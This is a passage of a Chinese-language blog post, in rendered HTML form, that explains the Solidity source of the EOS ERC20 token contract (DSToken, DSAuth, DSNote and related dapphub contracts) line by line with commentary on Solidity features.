constant returns (uint value);</span><br><span class=\"line\">    // 第三方可提币额度</span><br><span class=\"line\">    function allowance(address owner, address spender) constant returns (uint _allowance);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 转账到指定账户</span><br><span class=\"line\">    function transfer(address to, uint value) returns (bool ok);</span><br><span class=\"line\">    // 从第三方账户转账</span><br><span class=\"line\">    function transferFrom(address from, address to, uint value) returns (bool ok);</span><br><span class=\"line\">    // 设置提币额度</span><br><span class=\"line\">    function approve(address spender, uint value) returns (bool ok);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 转账事件</span><br><span class=\"line\">    event Transfer(address indexed from, address indexed to, uint value);</span><br><span class=\"line\">    // 提币事件</span><br><span class=\"line\">    event Approval(address indexed owner, address indexed spender, uint value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以太坊规定的一个代币接口。与普遍意义上的接口目的相同，对于某些功能的一些约定，满足接口来实现更方便的协同操作。如果代币都实现了接口，那么钱包就能使用同一套方式来操作这些代币等等。</p>\n<h3 id=\"8-DSTokenBase\"><a href=\"#8-DSTokenBase\" class=\"headerlink\" title=\"8. DSTokenBase\"></a>8. DSTokenBase</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 代币基础合约</span><br><span class=\"line\">contract DSTokenBase is ERC20, DSMath &#123;</span><br><span class=\"line\">    uint256                                            _supply; // 代币当前总量</span><br><span class=\"line\">    mapping (address =&gt; uint256)                       _balances; // 余额数组</span><br><span class=\"line\">    mapping (address =&gt; mapping (address =&gt; uint256))  _approvals; // 提币额度数组</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 构造函数</span><br><span class=\"line\">    function DSTokenBase(uint256 supply) &#123;</span><br><span class=\"line\">        _balances[msg.sender] = supply; // 设置发行代币者的初始余额</span><br><span class=\"line\">        _supply = supply; // 设置当前代币总额</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 返回当前代币总量</span><br><span class=\"line\">    function totalSupply() constant returns (uint256) &#123;</span><br><span class=\"line\">        return _supply;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 返回 src 用户的余额</span><br><span class=\"line\">    function balanceOf(address src) constant returns (uint256) &#123;</span><br><span class=\"line\">        return _balances[src];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 返回 guy 可以从 src 提取的币量</span><br><span class=\"line\">    function allowance(address src, address guy) constant returns (uint256) &#123;</span><br><span class=\"line\">        return _approvals[src][guy];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 从自己的余额中转移 wad 个代币到 dst 余额中</span><br><span class=\"line\">    function transfer(address dst, uint wad) returns (bool) &#123;</span><br><span class=\"line\">        // 自己的余额足够转账数量 否则 throw</span><br><span class=\"line\">        assert(_balances[msg.sender] &gt;= wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 通过 DSMath 来对余额进行增减</span><br><span class=\"line\">        _balances[msg.sender] = sub(_balances[msg.sender], wad);</span><br><span class=\"line\">        _balances[dst] = add(_balances[dst], wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 触发事件</span><br><span class=\"line\">        Transfer(msg.sender, dst, wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 从 src 转移 wad 个代币到 dst 余额</span><br><span class=\"line\">    function transferFrom(address src, address dst, uint wad) returns (bool) &#123;</span><br><span class=\"line\">    \t// 转账金额不能超额</span><br><span class=\"line\">        assert(_balances[src] &gt;= wad);</span><br><span class=\"line\">        assert(_approvals[src][msg.sender] &gt;= wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 通过 DSMath 来处理余额</span><br><span class=\"line\">        _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);</span><br><span class=\"line\">        _balances[src] = sub(_balances[src], wad);</span><br><span class=\"line\">        _balances[dst] = add(_balances[dst], wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 触发事件</span><br><span class=\"line\">        Transfer(src, dst, wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 设置 guy 可以从自己的余额中提取 wad 个代币</span><br><span class=\"line\">    function approve(address guy, uint256 wad) returns (bool) &#123;</span><br><span class=\"line\">        _approvals[msg.sender][guy] = wad;</span><br><span class=\"line\">        </span><br><span class=\"line\">        Approval(msg.sender, guy, wad);</span><br><span class=\"line\">        </span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>继承 <code>DSMath</code> 和抽象合约 <code>ERC20</code>。实现 <code>ERC20</code> 的代币函数，使用 <code>DSMath</code> 来处理余额。</p>\n<h3 id=\"9-DSToken\"><a href=\"#9-DSToken\" class=\"headerlink\" title=\"9. DSToken\"></a>9. DSToken</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 具体代币合约</span><br><span class=\"line\">// `DSTokenBase(0)` 运行了 `DSTokenBase` 的构造函数，传入的参数值为 0。</span><br><span class=\"line\">contract DSToken is DSTokenBase(0), DSStop &#123;</span><br><span class=\"line\">    bytes32  public  symbol; // 代币符号 如 EOS</span><br><span class=\"line\">    uint256  public  decimals = 18; // 标准的代币精度，可以被定制</span><br><span class=\"line\"></span><br><span class=\"line\">    // 构造函数 设置代币符号</span><br><span class=\"line\">    function DSToken(bytes32 symbol_) &#123;</span><br><span class=\"line\">        symbol = symbol_;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transfer(address dst, uint wad) stoppable note returns (bool) &#123;</span><br><span class=\"line\">        return super.transfer(dst, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transferFrom(</span><br><span class=\"line\">        address src, address dst, uint wad</span><br><span class=\"line\">    ) stoppable note returns (bool) &#123;</span><br><span class=\"line\">        return super.transferFrom(src, dst, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function approve(address guy, uint wad) stoppable note returns (bool) &#123;</span><br><span class=\"line\">        return super.approve(guy, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 推送 本合约 `transfer()` 的别名</span><br><span class=\"line\">    function push(address dst, uint128 wad) returns (bool) &#123;</span><br><span class=\"line\">        return transfer(dst, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 拉取 本合约 `transferFrom()` 的特例</span><br><span class=\"line\">    function pull(address src, uint128 wad) returns (bool) &#123;</span><br><span class=\"line\">        return transferFrom(src, msg.sender, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 充值 增加代币</span><br><span class=\"line\">    function mint(uint128 wad) auth stoppable note &#123;</span><br><span class=\"line\">        _balances[msg.sender] = add(_balances[msg.sender], wad);</span><br><span class=\"line\">        _supply = add(_supply, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 燃烧 销毁代币</span><br><span class=\"line\">    function burn(uint128 wad) auth stoppable note &#123;</span><br><span class=\"line\">        _balances[msg.sender] = sub(_balances[msg.sender], wad);</span><br><span class=\"line\">        _supply = sub(_supply, wad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Optional token name</span><br><span class=\"line\"></span><br><span class=\"line\">    bytes32   public  name = &quot;&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setName(bytes32 name_) auth &#123;</span><br><span class=\"line\">        name = name_;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>transfer / transferFrom / approve / mint / burn</code> 等方法使用了 <code>stoppable / note</code> 修饰器，在执行这些函数前，需要判断众筹是否已经停止，如果未停止，触发记录事件。</p>\n<p><code>mint / burn</code> 还在其他修饰器之前使用了 <code>auth</code> 修饰器，表示在使用这两个函数时，首要检查调用这些函数的用户是否合法。</p>\n<p>比起 <code>ERC20</code> 约定的基本函数，本合约额外增加了 <code>push / pull / mint / burn</code>。从具体代码来看，<code>push</code> 成了 <code>transfer</code> 的一个别名，而 <code>pull</code> 调用 <code>transferFrom</code> 时将 <code>dst</code> 固定为 <code>msg.sender</code>。从逻辑上来看，<code>push / pull</code> 是针对转账的额外处理，用于当前用户对自身余额的操作。<code>mint / burn</code> 则是对应于 <code>EOS</code> 的众筹方式。</p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>从区块浏览器内查询到的 EOS 合约如上。合约本身并不复杂，Solidity 的基本语法，和 ERC20 代币的逻辑。但是如 <code>DSToken</code> 合约中的 <code>mint / burn</code> 则与 EOS 的众筹方式相关：<a href=\"https://github.com/EOSIO/eos-token-distribution\" target=\"_blank\" rel=\"noopener\">GitHub 仓库</a> - <a href=\"https://etherscan.io/address/0xd0a6e6c54dbc68db5db3a091b171a77407ff7ccf#code\" target=\"_blank\" rel=\"noopener\">区块浏览器合约地址</a>。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://etherscan.io/address/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0#code\" target=\"_blank\" rel=\"noopener\">合约链接</a></p>\n<h2 id=\"结构组成\"><a href=\"#结构组成\" class=\"headerlink\" title=\"结构组成\"></a>结构组成</h2><p>使用了 <a href=\"https://github.com/dapphub\" target=\"_blank\" rel=\"noopener\">dapphub 的库</a>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A:DSAuthority-----     DSAuthEvents</span><br><span class=\"line\">                  |       |</span><br><span class=\"line\">A:ERC20\t DSMath\t   ---&gt; DSAuth      DSNote</span><br><span class=\"line\">   |\t   |              |           |</span><br><span class=\"line\">    -------                -----------</span><br><span class=\"line\">        |                     |</span><br><span class=\"line\">    DSTokenBase             DSStop</span><br><span class=\"line\">        |                     |</span><br><span class=\"line\">         ---------------------</span><br><span class=\"line\">                   |</span><br><span class=\"line\">                 DSToken</span><br><span class=\"line\"></span><br><span class=\"line\">A:abstract contract</span><br><span class=\"line\">下面的合约继承上面的合约。DSAuthority 在 DSAuth 中被使用。</span><br></pre></td></tr></table></figure>\n<h2 id=\"合约简介\"><a href=\"#合约简介\" class=\"headerlink\" title=\"合约简介\"></a>合约简介</h2><h3 id=\"1-DSNote\"><a href=\"#1-DSNote\" class=\"headerlink\" title=\"1. DSNote\"></a>1. <a href=\"https://dapp.tools/dappsys/ds-note.html\" target=\"_blank\" rel=\"noopener\">DSNote</a></h3><p>记录合约。定义了事件 <code>LogNote</code>，声明为 <code>anonymous</code>。定义了修饰器 <code>note</code>，内部会触发事件 <code>LogNote</code>。</p>\n<h3 id=\"2-DSAuth\"><a href=\"#2-DSAuth\" class=\"headerlink\" title=\"2. DSAuth\"></a>2. <a href=\"https://dapp.tools/dappsys/ds-auth.html\" target=\"_blank\" rel=\"noopener\">DSAuth</a></h3><p>2.1 DSAuthority</p>\n<p>抽象函数，只有一个 <code>canCall</code> 函数。</p>\n<p>2.2 DSAuthEvents</p>\n<p>认证事件合约。只有两个事件 <code>LogSerAuthority / LogSetOwner</code>。当设置 <code>Authority / Owner</code> 时触发。</p>\n<p>2.3 DSAuth</p>\n<p>继承了 <code>DSAuthEvents</code>。设置 <code>Authority / Owner</code>，以及对来源的检测。</p>\n<h3 id=\"3-DSStop\"><a href=\"#3-DSStop\" class=\"headerlink\" title=\"3. DSStop\"></a>3. <a href=\"https://dapp.tools/dappsys/ds-stop.html\" target=\"_blank\" rel=\"noopener\">DSStop</a></h3><p>继承 <code>DSAuth</code>，<code>DSNote</code>。设置 <code>stopped</code>，停止标识符。</p>\n<h3 id=\"4-DSMath\"><a href=\"#4-DSMath\" class=\"headerlink\" title=\"4. DSMath\"></a>4. <a href=\"https://dapp.tools/dappsys/ds-math.html\" target=\"_blank\" rel=\"noopener\">DSMath</a></h3><p>安全的常规数学运算。包含了 <code>uint256 / uint128 / int256 / WAD / RAY</code> 等相关的运算。</p>\n<h3 id=\"5-ERC20\"><a href=\"#5-ERC20\" class=\"headerlink\" title=\"5. ERC20\"></a>5. <a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md\" target=\"_blank\" rel=\"noopener\">ERC20</a></h3><p>以太坊上发行代币的接口。实现此接口，可以方便对代币进行操作。</p>\n<h3 id=\"6-DSToken\"><a href=\"#6-DSToken\" class=\"headerlink\" title=\"6. DSToken\"></a>6. <a href=\"https://dapp.tools/dappsys/ds-token.html\" target=\"_blank\" rel=\"noopener\">DSToken</a></h3><p>6.1 DSTokenBase</p>\n<p>继承 <code>ERC20 / DSMath</code> 合约。实现了抽象函数中的方法，完成了代币的基础功能。</p>\n<p>6.2 DSToken</p>\n<p>具体代币的合约，实际的交互合约。</p>\n<ul>\n<li>以上与所链接的文档有些许差别。</li>\n</ul>\n<h2 id=\"合约代码阅读\"><a href=\"#合约代码阅读\" class=\"headerlink\" title=\"合约代码阅读\"></a>合约代码阅读</h2><h3 id=\"1-DSNote-1\"><a href=\"#1-DSNote-1\" class=\"headerlink\" title=\"1. DSNote\"></a>1. DSNote</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 记录的合约</span><br><span class=\"line\">contract DSNote &#123;</span><br><span class=\"line\">    /*</span><br><span class=\"line\">    记录 事件 声明了 anonymous，使用了 indexed</span><br><span class=\"line\">    */ </span><br><span class=\"line\">    event LogNote(</span><br><span class=\"line\">        bytes4   indexed  sig,</span><br><span class=\"line\">        address  indexed  guy,</span><br><span class=\"line\">        bytes32  indexed  foo,</span><br><span class=\"line\">        bytes32  indexed  bar,</span><br><span class=\"line\">\tuint\t \t  wad,</span><br><span class=\"line\">        bytes             fax</span><br><span class=\"line\">    ) anonymous;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 修饰器</span><br><span class=\"line\">    modifier note &#123;</span><br><span class=\"line\">        bytes32 foo;</span><br><span class=\"line\">        bytes32 bar;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 内联汇编</span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            // := 赋值</span><br><span class=\"line\">            // calldataload(p) : 从 p 位置开始调用数据 (32 bytes)</span><br><span class=\"line\">            foo := calldataload(4)</span><br><span class=\"line\">            bar := calldataload(36)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 触发 记录事件</span><br><span class=\"line\">        LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);</span><br><span class=\"line\"></span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据<a href=\"https://solidity.readthedocs.io/en/latest/contracts.html#events\" target=\"_blank\" rel=\"noopener\"><code>event</code> 的文档描述</a>：</p>\n<blockquote>\n<p>Up to three parameters can receive the attribute <code>indexed</code> which will cause the respective arguments to be searched for: It is possible to filter for specific values of indexed arguments in the user interface.</p>\n</blockquote>\n<p>最多只能有三个参数可以接受 <code>indexed</code> 属性，不知道为什么此处有 4 个。<code>indexed</code> 指定的参数可以在用户界面中被搜索。</p>\n<p><code>anonymous</code> 的声明，<a href=\"https://solidity.readthedocs.io/en/latest/contracts.html#events\" target=\"_blank\" rel=\"noopener\"><code>event</code> 的文档描述</a>：</p>\n<blockquote>\n<p>The hash of the signature of the event is one of the topics except if you declared the event with <code>anonymous</code> specifier. This means that it is not possible to filter for specific anonymous events by name.</p>\n<p>除非你使用 <code>anonymous</code> 声明事件，否则事件签名的哈希值将成为 topic 之一。意思是无法通过名称筛选指定的 <code>anonymous</code> 事件。</p>\n</blockquote>\n<p><a href=\"https://solidity.readthedocs.io/en/latest/assembly.html#inline-assembly\" target=\"_blank\" rel=\"noopener\"><code>assembly</code> 的文档描述</a>：</p>\n<blockquote>\n<p>函数式赋值, 如 x := add(y, 3)</p>\n</blockquote>\n<p><a href=\"https://solidity.readthedocs.io/en/latest/assembly.html#opcodes\" target=\"_blank\" rel=\"noopener\"><code>opcodes</code> 的文档描述</a>：</p>\n<blockquote>\n<p>calldataload(p) : 从 p 位置开始调用数据 (32 bytes)</p>\n</blockquote>\n<p><code>foo, bar</code> 两个参数，一直是当前调用函数相关的值。</p>\n<h3 id=\"2-DSAuthority\"><a href=\"#2-DSAuthority\" class=\"headerlink\" title=\"2. DSAuthority\"></a>2. DSAuthority</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract DSAuthority &#123;</span><br><span class=\"line\">    // 函数未实现</span><br><span class=\"line\">    function canCall(</span><br><span class=\"line\">        address src, address dst, bytes4 sig</span><br><span class=\"line\">    ) constant returns (bool);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是一个抽象合约，<code>canCall</code> 函数未实现。<code>constant</code> 表示函数不会对合约状态进行修改。</p>\n<h3 id=\"3-DSAuthEvents\"><a href=\"#3-DSAuthEvents\" class=\"headerlink\" title=\"3. DSAuthEvents\"></a>3. DSAuthEvents</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract DSAuthEvents &#123;</span><br><span class=\"line\">    // 记录验证 事件</span><br><span class=\"line\">    event LogSetAuthority (address indexed authority);</span><br><span class=\"line\">    // 记录主人 事件</span><br><span class=\"line\">    event LogSetOwner     (address indexed owner);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>只包含了两个事件的声明。当用户设置 <code>authority / owner</code> 时会触发。</p>\n<h3 id=\"4-DSAuth\"><a href=\"#4-DSAuth\" class=\"headerlink\" title=\"4. DSAuth\"></a>4. DSAuth</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 认证合约</span><br><span class=\"line\">// `is` 表示继承了 `DSAuthEvents`</span><br><span class=\"line\">contract DSAuth is DSAuthEvents &#123;</span><br><span class=\"line\">    DSAuthority  public  authority;</span><br><span class=\"line\">    address      public  owner;</span><br><span class=\"line\">  </span><br><span class=\"line\">    // 修饰器</span><br><span class=\"line\">    modifier auth &#123;</span><br><span class=\"line\">        // isAuthorized() 为 true</span><br><span class=\"line\">        assert(isAuthorized(msg.sender, msg.sig));</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 修饰器 未被使用到</span><br><span class=\"line\">    modifier authorized(bytes4 sig) &#123;</span><br><span class=\"line\">    \t// isAuthorized() 为 true</span><br><span class=\"line\">        assert(isAuthorized(msg.sender, sig));</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    // 构造函数，设置 owner</span><br><span class=\"line\">    function DSAuth() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        LogSetOwner(msg.sender);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 验证函数</span><br><span class=\"line\">    function assert(bool x) internal &#123;</span><br><span class=\"line\">        if (!x) throw;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 通过 auth 验证，设置 owner，触发事件</span><br><span class=\"line\">    function setOwner(address owner_) auth</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        owner = owner_;</span><br><span class=\"line\">        LogSetOwner(owner);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 通过 auth 验证，设置 authority，触发事件</span><br><span class=\"line\">    function setAuthority(DSAuthority authority_) auth</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        authority = authority_;</span><br><span class=\"line\">        LogSetAuthority(authority);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 认证函数 根据 src 和 authority 的情况来返回操作结果</span><br><span class=\"line\">    function isAuthorized(address src, bytes4 sig) internal returns (bool) &#123;</span><br><span class=\"line\">        if (src == address(this)) &#123; </span><br><span class=\"line\">            return true;</span><br><span class=\"line\">        &#125; else if (src == owner) &#123; </span><br><span class=\"line\">            return true;</span><br><span class=\"line\">        &#125; else if (authority == DSAuthority(0)) &#123; </span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            return authority.canCall(src, this, sig);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>合约继承了认证事件。合约主要用来对认证部分进行处理。在设置 owner 和 authority 之前，触发 auth 修饰器，通过函数 <code>isAuthorized()</code> 来对消息发送者 <code>msg</code> 进行验证。消息发送者 <code>msg</code> 包含：</p>\n<p>4.1 <code>msg.data(bytes)</code>：完整的调用数据<br>4.2 <code>msg.gas(uint)</code>：剩余燃气 - 在版本 0.4.21 中废弃并由 <code>gasleft()</code> 取代<br>4.3 <code>msg.sender(address)</code>：当前消息的发送者<br>4.4 <code>msg.sig(bytes4)</code>：调用数据的前四个字节（即函数的标识符）<br>4.5 <code>msg.value(uint)</code>：伴随消息发送的 wei 的数值</p>\n<p>函数 <code>isAuthorized()</code> 是 <code>internal</code> 内部函数，只能在内部或者派生的合约中被调用，无需使用 <code>this</code>。首先将 <code>src</code> 与 <code>this</code> 的地址进行比较，如果为 <code>true</code> 则返回 <code>true</code>。<a href=\"https://solidity.readthedocs.io/en/latest/units-and-global-variables.html#contract-related\" target=\"_blank\" rel=\"noopener\"><code>this</code> 的定义</a>是：</p>\n<blockquote>\n<p><code>this</code> (current contract’s type): the current contract, explicitly convertible to Address</p>\n<p>当前合约的类型：当前的合约，显式转换为地址。</p>\n</blockquote>\n<p>然后比较 <code>src</code> 与 <code>owner</code>，如果为 <code>true</code> 返回 <code>true</code>。构造函数中 <code>owner</code> 就是部署合约的用户地址，因为构造函数只设置了 <code>owner</code>，所以默认只用操作 <code>owner</code>，到此就截止了。</p>\n<p>然后比较 <code>authority</code> 与 <code>DSAuthority(0)</code>。<code>DSAuthority(0)</code> 表示将 0 强制转换成 <code>DSAuthority</code> 类型，此时与 <code>authority</code> 进行比较，如果相等，则说明 <code>authority</code> 未被赋值。因为任何变量如果没有被赋值，那么它的初始值就是 0。所以相等，说明未被赋值过，返回 false。而如果比较结果为 false，则说明使用了 <code>authority</code> 变量，那么可以进行下一步了，即调用 <code>authority.canCall(src, this, sig)</code> 并返回其结果。此处 <code>canCall</code> 